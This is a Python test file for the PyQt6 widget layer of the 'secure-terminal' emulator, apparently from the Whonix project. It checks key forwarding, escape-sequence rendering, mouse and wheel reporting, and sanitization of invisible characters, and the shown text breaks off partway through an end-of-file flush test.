#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""
Offscreen widget/window tests for secure-terminal: the behaviour that lives in
the Qt layer (terminal.py / main.py / dialog.py) rather than the pure core.
Needs PyQt6 (offscreen) and python3-pyte. These are declared dependencies of the
test (the CI container installs them), so a missing one is a hard FAILURE, not a
skip -- a security-relevant test must never be silently disabled. Exit 0 on full
pass, 1 on any failure or missing dependency.
"""

import os
import sys
import signal
import tempfile

os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp(prefix='st-widget-cfg-')
# Isolate session state too, or a real leftover session on the box would be
# restored and make the window's initial mode/tabs nondeterministic.
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-widget-state-')
try:
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
except (OSError, ValueError, AttributeError):
    pass                    # not the main thread / unsupported: reaping is optional

try:
    from PyQt6.QtWidgets import QApplication, QInputDialog
    from PyQt6.QtGui import QKeyEvent, QColor
    from PyQt6.QtCore import QEvent, Qt, QTimer, QEventLoop, QMimeData
    from secure_terminal.terminal import SecureTerminal, tui_available
except Exception as exc:  # pylint: disable=broad-except
    # Fail closed: a missing test dependency (PyQt6, pyte, the module) must not
    # be silently skipped.
    sys.stderr.write('secure-terminal-tests(widget): FAIL missing dependency: '
                     '%s\n' % exc)
    sys.exit(1)

APP = QApplication.instance() or QApplication([])
PASS = 0
FAIL = 0


def ok(cond, msg):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        sys.stderr.write('FAIL: ' + msg + '\n')


def eq(got, want, msg):
    ok(got == want, '%s -> %r, want %r' % (msg, got, want))


def pump(ms):
    loop = QEventLoop()
    QTimer.singleShot(ms, loop.quit)
    loop.exec()


def key(term, qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    term.keyPressEvent(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


def spy_writes(term):
    sent = []
    term._write = sent.append          # pylint: disable=protected-access
    return sent


def feed_output(term, raw):
    """Drive the real _on_readable with `raw` bytes via a pipe, as if the child had
    printed them, so the full output path (pyte feed + _handle_osc + line render)
    runs -- not a shortcut that skips the OSC read handlers."""
    r, w = os.pipe()
    old = term._fd                         # pylint: disable=protected-access
    term._fd = r
    try:
        os.write(w, raw)
        os.close(w)
        w = None
        term._on_readable()                # pylint: disable=protected-access
    finally:
        term._fd = old
        os.close(r)
        if w is not None:
            os.close(w)
    # CLI line-mode paints are debounced to ~60fps by a single-shot timer; in the
    # live app the paint fires from the event loop shortly after the read. These
    # synchronous tests feed then inspect at once, so flush the pending paint here
    # (the same flush teardown and every transcript/copy getter perform) so the
    # document reflects the just-fed bytes without pumping a real 16ms wait.
    term._flush_paint()


# MARKING_COLORS is theme-keyed {fg, bg} per risk class (dark gets a background
# BAND on the dangerous classes; light and honest-foreign stay fg-only). These
# read the fg / bg for a widget's CURRENT theme.
def mark_fg(term, cls):
    return term.MARKING_COLORS[term._theme][cls]['fg']    # noqa: protected-access


def mark_bg(term, cls):
    return term.MARKING_COLORS[term._theme][cls]['bg']    # noqa: protected-access


# A `-- PROGRAM` launch tab now correctly counts as a running program, so closing
# its window pops the confirm-on-close dialog -- which would block the user-less
# harness. Auto-answer "Yes" (quit anyway) so window closes never hang here;
# test_mainwin owns the explicit confirm-close behaviour tests.
from PyQt6.QtWidgets import QMessageBox as _QMB_close        # noqa: E402
_QMB_close.question = staticmethod(lambda *_a, **_k: _QMB_close.StandardButton.Yes)


# --- line-mode key forwarding -------------------------------------------------
t = SecureTerminal(command='/bin/cat')
sent = spy_writes(t)
key(t, Qt.Key.Key_A, 'a')
key(t, Qt.Key.Key_Return)
key(t, Qt.Key.Key_Backspace)
key(t, Qt.Key.Key_Tab)
eq(sent, [b'a', b'\r', b'\x7f', b'\t'], 'line keys forwarded')
sent.clear()
key(t, Qt.Key.Key_D, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+D EOF
key(t, Qt.Key.Key_L, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+L clear
eq(sent, [b'\x04', b'\x0c'], 'ctrl D/L are bytes')
sent.clear()
# Ctrl+<letter> sends its control byte, like a real terminal: cooked mode turns
# 0x03 into SIGINT, a raw-mode app reads the byte itself (readline Ctrl+A/R, an
# app's own "press Ctrl+C again to exit"). Ctrl+backslash -> 0x1c (SIGQUIT).
key(t, Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_A, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_R, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Backslash, '', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x03', b'\x01', b'\x12', b'\x1c'], 'ctrl+key sends its control byte')
# the rest of the Ctrl+@..Ctrl+_ range: forward the control byte Qt computed
# (Ctrl+] -> 0x1d, Ctrl+/ -> 0x1f readline-undo, Ctrl+[ -> 0x1b ESC)
sent.clear()
key(t, Qt.Key.Key_BracketRight, '\x1d', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Slash, '\x1f', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_BracketLeft, '\x1b', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x1d', b'\x1f', b'\x1b'], 'ctrl+punctuation forwards its control byte')
# a whitespace control (Ctrl+Return carries \r) is NOT swallowed by that
# fallback -- it still submits via the Return path
sent.clear()
key(t, Qt.Key.Key_Return, '\r', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\r'], 'ctrl+return still submits the line, not swallowed as a control byte')
# printable non-ASCII is a deliberate keystroke -> sent UTF-8 (euro, e-acute)
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x20AC))       # euro sign
key(t, Qt.Key.Key_unknown, chr(0x00E9))       # e-acute
eq(sent, [chr(0x20AC).encode('utf-8'), chr(0x00E9).encode('utf-8')],
   'printable unicode input sent as utf-8')
# a non-printable keystroke (bidi override) is still dropped
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x202E))       # RLO bidi override
eq(sent, [], 'non-printable (bidi) input dropped')

# --- _append: backspace erase, CRLF, overwrite, line-local --------------------
a = SecureTerminal(command='/bin/cat')
a._append('abc')
a._append('\x08 \x08')                 # readline erase
eq(a.toPlainText().rstrip(), 'ab', 'backspace erase')
b = SecureTerminal(command='/bin/cat')
b._append('l1\r\nl2\r\n')
eq(b.toPlainText(), 'l1\nl2\n', 'CRLF collapsed')
c = SecureTerminal(command='/bin/cat')
c._append('123456')
c._append('\rAB')
eq(c.toPlainText(), 'AB3456', 'bare CR overwrite')
d = SecureTerminal(command='/bin/cat')
d._append('first\nsecond')
d._append('\rX')
eq(d.toPlainText(), 'first\nXecond', 'CR line-local')
# multi-backspace: five readline erases delete five chars (persistent cursor)
mb = SecureTerminal(command='/bin/cat')
mb._append('fffff')
for _ in range(5):
    mb._append('\x08 \x08')
eq(mb.toPlainText().rstrip(), '', 'five backspaces erase five chars')

# Real interactive-zsh redraw streams captured under TERM=secure-terminal with
# zsh-autosuggestions + syntax-highlighting. These MUST resolve to the plain text,
# never the append-garble ("llslsls" / "eexport ...") -- the redraws use backspace,
# per-keystroke SGR, AND CSI cursor moves (\x1b[<n>D / \x1b[<n>C), all of which the
# line renderer must honor as overwrites.
zl = SecureTerminal(command='/bin/cat')     # typing "ls" (per-keystroke echo)
zl._append('l\x08l\x1b[90ms\x1b[39m\x08\x08ls\x08\x08\x1b[36ml\x1b[36ms\x1b[39m')
eq(zl.toPlainText().rstrip(), 'ls',
   'zsh per-keystroke redraw of "ls" resolves to "ls", not the append-garble')
zc = SecureTerminal(command='/bin/cat')     # CSI cursor-back overwrite
zc._append('abc\x1b[2DXY')
eq(zc.toPlainText().rstrip(), 'aXY',
   'CSI cursor-back (\\x1b[2D) overwrites in place, not appends')
zr = SecureTerminal(command='/bin/cat')     # burst re-export echo (CSI-back redraw)
zr._append('export TERM=secure-terminal\x1b[27D'
           '\x1b[33me\x1b[33mx\x1b[33mp\x1b[33mo\x1b[33mr\x1b[33mt\x1b[39m\x1b[1C'
           '\x1b[37mT\x1b[37mE\x1b[37mR\x1b[37mM\x1b[37m=\x1b[37ms\x1b[37me\x1b[37mc'
           '\x1b[37mu\x1b[37mr\x1b[37me\x1b[37m-\x1b[37mt\x1b[37me\x1b[37mr\x1b[37mm'
           '\x1b[37mi\x1b[37mn\x1b[37ma\x1b[37ml\x1b[39m')
eq(zr.toPlainText().rstrip(), 'export TERM=secure-terminal',
   'burst re-export echo resolves cleanly, not "eexport ..."')
# BEL is cursor-neutral (rings the bell, writes no cell, moves no column) -- like
# every real terminal. Treating it as a cell shifted the cursor one column off on
# any line-editor redraw that beeps (a completion menu emits BEL), so a following
# backspace+reprint duplicated a character: the garbled tab-completion (#87).
zbel = SecureTerminal(command='/bin/cat')
zbel._append('abc\x07def')
eq(zbel.toPlainText().rstrip(), 'abcdef',
   'a BEL is consumed: no cell and no cursor movement')
zbel2 = SecureTerminal(command='/bin/cat')
zbel2._append('ls a\x07\x08a')          # typed text, completion beep, redraw
eq(zbel2.toPlainText().rstrip(), 'ls a',
   'a BEL before a backspace+reprint does not duplicate a char (#87)')

# The neutralized-byte placeholder is DISPLAYED as a box (U+25A1) for readability,
# but every text export (copy / save / toPlainText) maps it back to ASCII '_', so
# a copied or saved transcript stays pure ASCII. Box mode only.
boxt = SecureTerminal(command='/bin/cat')
boxt._mode = 'box'
feed_output(boxt, 'caf\xc3\xa9\xe2\x80\x8b\n'.encode('utf-8'))   # e-acute + zero-width
ok('\u25a1' in boxt.document().toPlainText(),
   'box display shows the box for a neutralized byte')
ok('\u25a1' not in boxt.toPlainText() and '_' in boxt.toPlainText(),
   'export (toPlainText) maps the box back to ASCII _')
data = boxt.createMimeDataFromSelection
boxt.selectAll()
ok('\u25a1' not in boxt.createMimeDataFromSelection().text(),
   'copy maps the box back to ASCII _')
# Show mode is the opt-in to copy real unicode, so it does NOT collapse to ASCII:
# a printable glyph is copied as itself, while a no-glyph character (shown as a
# box) copies as that box -- never as the raw invisible/bidi byte, which is the
# hazard. So the dangerous character still never reaches the clipboard.
sht = SecureTerminal(command='/bin/cat')
sht._mode = 'show'
# real UTF-8 for e-acute (U+00E9) + a zero-width space (U+200B); build the code
# points then encode, so the bytes are genuine UTF-8, not double-encoded.
feed_output(sht, 'caf\u00e9\u200b\n'.encode('utf-8'))
_sh_export = sht.toPlainText()
ok('\u00e9' in _sh_export, 'show mode copies a real printable glyph as itself (e-acute kept)')
ok('\u25a1' in _sh_export and '\u200b' not in _sh_export,
   'show mode copies a no-glyph char as the box, never the raw zero-width byte')

# --- horizontal scroll: a terminal WRAPS to the width, never hides content off-screen ---
# A real terminal has no horizontal scroll. Detail/Reveal expand each cell to a wide
# <U+XXXX> badge, so the DISPLAY wraps to the viewport (WidgetWidth); Box/Show cells are
# ~1 column and stay NoWrap so a glyph keeps its line/column across a box<->show toggle;
# the TUI grid is sized to fit and never wraps. Regression: Detail was NoWrap, so a long
# line overflowed the width and the auto-follow (ensureCursorVisible) scrolled the viewport
# to the caret's column, parking it mid-line and hiding the start of every row.
from PyQt6.QtWidgets import QPlainTextEdit as _QPTE                # noqa: E402
_WW = _QPTE.LineWrapMode.WidgetWidth
_NW = _QPTE.LineWrapMode.NoWrap
_wm = SecureTerminal(command='/bin/cat')
eq(_wm.lineWrapMode(), _WW, 'CLI Detail (default) wraps the display to the width')
_wm.apply_mode('reveal')
eq(_wm.lineWrapMode(), _WW, 'CLI Reveal wraps the display to the width')
_wm.apply_mode('box')
eq(_wm.lineWrapMode(), _NW, 'CLI Box does not wrap (glyph line/column stable across box<->show)')
_wm.apply_mode('show')
eq(_wm.lineWrapMode(), _NW, 'CLI Show does not wrap (glyph line/column stable across box<->show)')
_wm.close()
_wmt = SecureTerminal(command='/bin/cat', tui=True)
eq(_wmt.lineWrapMode(), _NW,
   'TUI grid never wraps (sized to fit; Detail/Reveal cells fall back to the box)')
_wmt.close()

# Horizontal scrollbar policy tracks the display mode: a TUI grid is a fixed
# viewport-wide canvas (a real terminal never shows a horizontal bar on one), so
# it is AlwaysOff; CLI keeps AsNeeded so a genuinely long NoWrap Box/Show line
# stays reachable by a real scroll. Policy-only, so font-independent.
from PyQt6.QtCore import Qt as _Qt                                 # noqa: E402
_OFF = _Qt.ScrollBarPolicy.ScrollBarAlwaysOff
_ASN = _Qt.ScrollBarPolicy.ScrollBarAsNeeded
_sb = SecureTerminal(command='/bin/cat')                          # CLI
eq(_sb.horizontalScrollBarPolicy(), _ASN,
   'CLI mode keeps the horizontal scrollbar AsNeeded')
_sb.apply_tui(True)
eq(_sb.horizontalScrollBarPolicy(), _OFF,
   'TUI grid suppresses the horizontal scrollbar (AlwaysOff)')
_sb.apply_tui(False)
eq(_sb.horizontalScrollBarPolicy(), _ASN,
   'switching TUI->CLI restores the AsNeeded horizontal scrollbar')
_sb.close()
_sbt = SecureTerminal(command='/bin/cat', tui=True)
eq(_sbt.horizontalScrollBarPolicy(), _OFF,
   'a tab created in TUI mode starts with the horizontal scrollbar suppressed')
_sbt.close()

# alternate scroll: a full-screen program that did NOT request the mouse (a plain
# pager in the alternate screen) has no local scrollback to move, so the wheel is
# translated to arrow-key line scrolls (xterm's alternateScroll). A program that DID
# request the mouse instead gets full SGR mouse reporting -- see the konsole-parity
# block below. The normal screen keeps the local wheel scroll (nothing to the child).
import re                                                         # noqa: E402
from PyQt6.QtGui import QWheelEvent, QMouseEvent as _QME, QFocusEvent as _QFEv  # noqa: E402
from PyQt6.QtCore import QPoint as _QP, QPointF as _QPF, QEvent  # noqa: E402,F811
_alt = SecureTerminal(command='/bin/cat', tui=True)
_asent = spy_writes(_alt)
_SGR_RE = re.compile(rb'^\x1b\[<(\d+);(\d+);(\d+)([Mm])$')


def _wheel_ev(dy, mods=Qt.KeyboardModifier.NoModifier, dx=0, pos=(5, 5)):
    p = _QPF(pos[0], pos[1])
    return QWheelEvent(p, p, _QP(0, 0), _QP(dx, dy),
                       Qt.MouseButton.NoButton, mods,
                       Qt.ScrollPhase.NoScrollPhase, False)


def _parse_sgr(chunks):
    """(button, col, row, 'M'|'m') of a single SGR mouse report in `chunks`, or None
    -- coordinate-robust across font envs (asserts structure, not exact cells)."""
    m = _SGR_RE.match(b''.join(chunks))
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)),
            m.group(4).decode()) if m else None


def _mev(kind, btn, mods=Qt.KeyboardModifier.NoModifier, buttons=None, pos=(200, 100)):
    p = _QPF(pos[0], pos[1])
    held = buttons if buttons is not None else (
        btn if kind == QEvent.Type.MouseButtonPress else Qt.MouseButton.NoButton)
    return _QME(kind, p, p, btn, held, mods)


_alt._alt_screen = True
_alt.wheelEvent(_wheel_ev(-120))          # wheel DOWN -> arrow-down x3
eq(b''.join(_asent), b'\x1b[B' * 3, 'alt-screen wheel down sends arrow-down to the child')
_asent.clear()
_alt.wheelEvent(_wheel_ev(120))           # wheel UP -> arrow-up x3
eq(b''.join(_asent), b'\x1b[A' * 3, 'alt-screen wheel up sends arrow-up to the child')
_asent.clear()
_alt._alt_screen = False
_alt.wheelEvent(_wheel_ev(-120))          # normal screen -> local scroll, no arrows
eq(_asent, [], 'normal-screen wheel does not send arrows (keeps local scrollback scroll)')
# a high-res trackpad streams tiny deltas: accumulate one line per ~40 units, NOT one
# arrow per micro-event (the hyperscroll a min-1-per-event formula would cause)
_alt._alt_screen = True
_alt._wheel_accum = 0
_asent.clear()
for _ in range(39):
    _alt.wheelEvent(_wheel_ev(-1))
eq(_asent, [], 'trackpad micro-deltas below one line send nothing yet (no hyperscroll)')
_alt.wheelEvent(_wheel_ev(-1))            # the 40th unit crosses one line
eq(b''.join(_asent), b'\x1b[B', 'accumulated micro-deltas emit one line per ~40 units')
# A stale sub-line wheel remainder must NOT survive an alt-screen transition, or
# the first small wheel in the NEXT full-screen app crosses the per-line threshold
# early and emits a spurious arrow. feed_output drives the real transition path.
_alt._wheel_accum = 39
feed_output(_alt, b'\x1b[?1049l')          # leave the alt screen
eq(_alt._wheel_accum, 0, 'alt-screen EXIT drops any stale wheel-scroll remainder')
_alt._wheel_accum = 39
feed_output(_alt, b'\x1b[?1049h')          # re-enter the alt screen
eq(_alt._wheel_accum, 0, 'alt-screen ENTER drops any stale wheel-scroll remainder')

# konsole/xterm mouse-reporting parity: once the child requests tracking (1000/
# 1002/1003) + SGR encoding (1006), its mouse and wheel events are REPORTED to it at
# the cell UNDER THE POINTER (not a pinned corner, not arrow keys). Shift is the
# local override throughout. feed_output drives the real DECSET scan that arms this.
_alt.show()
_alt._cols = 80
_alt._alt_screen = True
_alt._wheel_accum = 0
_alt._wheel_accum_x = 0
feed_output(_alt, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1004h\x1b[?1006h')
ok(_alt._mouse_report_on(), 'tracking + SGR arms mouse reporting')
ok(_alt.hasMouseTracking(), '1003 any-motion turns on widget mouse tracking')

# wheel: vertical 64 up / 65 down, at the pointer cell (real coordinate, NOT 1;1).
_asent.clear()
_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
_wd = _parse_sgr(_asent)
ok(_wd is not None and _wd[0] == 65 and _wd[3] == 'M', 'wheel down -> SGR button 65 press')
ok(_wd[1] > 1 or _wd[2] > 1, 'the wheel report uses the pointer cell, not a pinned 1;1')
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(120, pos=(200, 100)))
ok(_parse_sgr(_asent)[0] == 64, 'wheel up -> SGR button 64')
# horizontal wheel -> 66 left / 67 right (trackpad/tilt parity)
_asent.clear()
_alt._wheel_accum_x = 0
_alt.wheelEvent(_wheel_ev(0, dx=120, pos=(200, 100)))
ok(_parse_sgr(_asent)[0] == 67, 'horizontal wheel right -> SGR button 67')
_asent.clear()
_alt._wheel_accum_x = 0
_alt.wheelEvent(_wheel_ev(0, dx=-120, pos=(200, 100)))
ok(_parse_sgr(_asent)[0] == 66, 'horizontal wheel left -> SGR button 66')
# a huge single delta is CAPPED at 8 reports (no unbounded burst)
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120 * 12, pos=(200, 100)))
eq(len(_asent), 8, 'a huge wheel delta is capped at 8 reports')

# buttons: left/middle/right press (0/1/2 'M') + release (same code, 'm')
for _btn, _code in ((Qt.MouseButton.LeftButton, 0),
                    (Qt.MouseButton.MiddleButton, 1),
                    (Qt.MouseButton.RightButton, 2)):
    _asent.clear()
    _alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, _btn))
    _pp = _parse_sgr(_asent)
    ok(_pp[0] == _code and _pp[3] == 'M', 'press button %d -> SGR %d M' % (_code, _code))
    _asent.clear()
    _alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, _btn))
    _pr = _parse_sgr(_asent)
    ok(_pr[0] == _code and _pr[3] == 'm', 'release button %d -> SGR %d m' % (_code, _code))

# keyboard modifiers encoded: Ctrl +16, Alt +8 (Shift is NEVER encoded)
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          Qt.KeyboardModifier.ControlModifier))
ok(_parse_sgr(_asent)[0] == 0 + 16, 'Ctrl+left press encodes the +16 modifier bit')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          Qt.KeyboardModifier.AltModifier))
ok(_parse_sgr(_asent)[0] == 0 + 8, 'Alt+left press encodes the +8 modifier bit')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))

# drag (button held) reports motion +32, coalesced to one report per CELL
_alt._mouse_report_cell = None
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          pos=(40, 40)))
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.LeftButton, pos=(400, 300)))
_dm = _parse_sgr(_asent)
ok(_dm is not None and _dm[0] == 0 + 32, 'left-drag reports motion with the +32 flag')
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.LeftButton, pos=(400, 300)))
eq(_asent, [], 'a drag within the SAME cell is coalesced (no duplicate report)')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton,
                            pos=(400, 300)))

# any-motion (1003), no button held, reports code 3+32 = 35
_alt._mouse_report_cell = None
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton, pos=(120, 90)))
ok(_parse_sgr(_asent)[0] == 3 + 32, 'button-less any-motion reports code 35 (3 + motion)')
# middle- and right-button drags carry their own button code (1/2) + the +32 motion
_alt._mouse_report_cell = None
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.MiddleButton, pos=(300, 200)))
ok(_parse_sgr(_asent)[0] == 1 + 32, 'middle-drag reports code 33 (1 + motion)')
_alt._mouse_report_cell = None
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.RightButton, pos=(360, 260)))
ok(_parse_sgr(_asent)[0] == 2 + 32, 'right-drag reports code 34 (2 + motion)')
# Shift keeps motion LOCAL -- it falls through to the base handler, no report
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         Qt.KeyboardModifier.ShiftModifier,
                         buttons=Qt.MouseButton.LeftButton, pos=(500, 400)))
eq(_asent, [], 'Shift+drag is local (no motion report)')

# focus in/out reported under 1004
_asent.clear()
_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
eq(b''.join(_asent), b'\x1b[I', 'focus-in reports ESC[I under mode 1004')
_asent.clear()
_alt.focusOutEvent(_QFEv(QEvent.Type.FocusOut))
eq(b''.join(_asent), b'\x1b[O', 'focus-out reports ESC[O under mode 1004')

# Shift is the LOCAL override: Shift+wheel and Shift+press write nothing to the child
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, Qt.KeyboardModifier.ShiftModifier, pos=(200, 100)))
eq(_asent, [], 'Shift+wheel is local (no report to the child)')
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          Qt.KeyboardModifier.ShiftModifier))
eq(_asent, [], 'Shift+press is local text selection (no report)')

# _event_cell clamps: a point past the right/bottom edge clamps to the column/row
# count (a click in the sub-row strip below the last row must not name a row past the
# grid); the top-left corner clamps to 1;1 (never a cell off the grid).
_alt._rows = 24                          # winsize height the child knows its screen as
_asent.clear()
_alt.wheelEvent(_wheel_ev(-120, pos=(100000, 100000)))
_edge = _parse_sgr(_asent)
ok(_edge[1] == 80, 'a point past the right edge clamps col to the grid width')
ok(_edge[2] == 24, 'a point past the bottom edge clamps row to the grid height')
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, pos=(-1000, -1000)))
_c = _parse_sgr(_asent)
ok(_c[1] == 1 and _c[2] == 1, 'a point above/left of the grid clamps to cell 1;1')

# a button not in the SGR table (e.g. a mouse back-button) is NOT reported; it falls
# through to the local handler
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.BackButton))
eq(_asent, [], 'a non-SGR button (back) is not reported')

# double-click while the child grabs the mouse reports a press, not a word-select
_asent.clear()
_alt.mouseDoubleClickEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
ok(_parse_sgr(_asent) is not None and _parse_sgr(_asent)[3] == 'M',
   'a double-click is reported as a press when the child grabs the mouse')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))

# CHORD: left+right pressed together each report a press; releasing EACH must report
# its OWN button. Tracking a single button lost the first release, leaving it stuck
# in the child (no protocol release). codex ai-review.
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.RightButton,
                          buttons=Qt.MouseButton.LeftButton | Qt.MouseButton.RightButton))
_asent.clear()
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.RightButton,
                            buttons=Qt.MouseButton.LeftButton))
_chord_r = _parse_sgr(_asent)
_asent.clear()
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
_chord_l = _parse_sgr(_asent)
ok(_chord_r is not None and _chord_r[0] == 2 and _chord_r[3] == 'm',
   'chord: releasing right reports a right release (code 2, m)')
ok(_chord_l is not None and _chord_l[0] == 0 and _chord_l[3] == 'm',
   'chord: releasing left ALSO reports (code 0, m) -- the button is not left stuck')

# INPUT SUSPENDED during a paste/copy review: with mouse tracking on and the review
# bar up, a NEW click / wheel / focus must NOT write to the child (keyPressEvent
# already refuses keys), nor track a button (which would unbalance a later release).
# grok ai-review.
_alt._review_active = True
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
eq(_asent, [],
   'input suspended during review: no mouse / wheel / focus report reaches the child')
ok(not _alt._mouse_report_btns,
   'no button is tracked during review (so no unmatched release fires later)')
_alt._review_active = False
_alt._mouse_selecting = False

# the child resets the modes (well-behaved exit): reporting stops, mouse tracking
# off, and the alt-screen wheel falls back to the arrow surrogate
feed_output(_alt, b'\x1b[?1000l\x1b[?1002l\x1b[?1003l\x1b[?1004l\x1b[?1006l')
ok(not _alt._mouse_report_on() and not _alt.hasMouseTracking(),
   'a full mode reset stops reporting and mouse tracking')
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
eq(b''.join(_asent), b'\x1b[B' * 3,
   'after a mode reset the alt-screen wheel falls back to arrow keys')
# focus is NOT reported once 1004 is cleared
_asent.clear()
_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
eq(_asent, [], 'focus is not reported once mode 1004 is cleared')
_alt.close()

# A split DECSET mouse-mode marker is still seen across a read() boundary (same
# carry guarantee as the alt-screen scan).
_msplit = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_msplit, b'\x1b[?100')             # half of ?1002h
ok(not _msplit._mouse_modes, 'a half mouse-mode marker does not yet arm the request')
feed_output(_msplit, b'2h\x1b[?1006h')         # completes across the boundary
ok(_msplit._mouse_modes == {1002, 1006},
   'a split mouse-mode marker is detected across the read boundary')
# A stray semicolon (empty param field) is tolerated, not a crash: ESC[?1000;h
# arms 1000 and ignores the empty field.
feed_output(_msplit, b'\x1b[?1000;h')
ok(1000 in _msplit._mouse_modes,
   'a DECSET with an empty param field arms the named mode and ignores the blank')
# A hostile over-long DECSET parameter must NOT crash the read loop: bare int()
# raises above Python's 4300-digit string limit, so the scan parses via _safe_int
# (out-of-range -> 0 -> ignored). Regression for the DoS finding.
feed_output(_msplit, b'\x1b[?' + b'1' * 4301 + b'h')
ok(0 not in _msplit._mouse_modes and isinstance(_msplit._mouse_modes, set),
   'an over-long DECSET parameter is ignored, not a ValueError crash')
# RIS (ESC c) and DECSTR (ESC [ ! p) are FULL resets that clear tracked mouse modes,
# so `reset` (or a program's soft reset) disables tracking that untrusted output
# turned on -- the usual recovery. Folded in ORDER: a reset then a re-enable leaves
# only the re-enabled modes. grok ai-review.
from secure_terminal.sanitize import scan_mouse_modes           # noqa: E402
eq(scan_mouse_modes('\x1bc', {1000, 1006}), set(),
   'scan_mouse_modes: RIS (ESC c) clears all tracked mouse modes')
eq(scan_mouse_modes('\x1b[!p', {1000, 1006}), set(),
   'scan_mouse_modes: DECSTR (ESC [ ! p) clears all tracked mouse modes')
eq(scan_mouse_modes('\x1b[?1000h\x1bc\x1b[?1006h', set()), {1006},
   'scan_mouse_modes: a reset then a re-enable leaves only the re-enabled mode')
_msplit.close()
# end to end through the widget (a fresh tab, so no earlier modes linger): feeding
# RIS clears the tracked modes (the reset-recovery path).
_mris = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_mris, b'\x1b[?1000;1006h')
ok(_mris._mouse_modes == {1000, 1006}, 'widget tracks a combined DECSET')
feed_output(_mris, b'\x1bc')
ok(not _mris._mouse_modes, 'feeding RIS through the widget clears the mouse modes')
_mris.close()

# EOF flush: a program's FINAL output that ends mid-escape must NOT vanish. In CLI
# mode feed_chunk_carry holds a trailing possibly-incomplete escape in _esc_carry;
# on child exit it will never complete, so it is flushed (its payload rendered)
# rather than dropped -- regression for the silent-final-output-loss finding.
_eoft = SecureTerminal(command='/bin/cat', tui=False)
feed_output(_eoft, b'result: \x1b' + b'!' * 50)     # ends with a dangling ESC tail
ok('!' * 50 not in _eoft.transcript_text(),
   'the dangling escape tail is held back, not shown yet')
_er, _ew = os.pipe()                                 # an empty pipe, write end closed:
os.close(_ew)                                        # the next read returns b'' (EOF)
_eoft._fd = _er
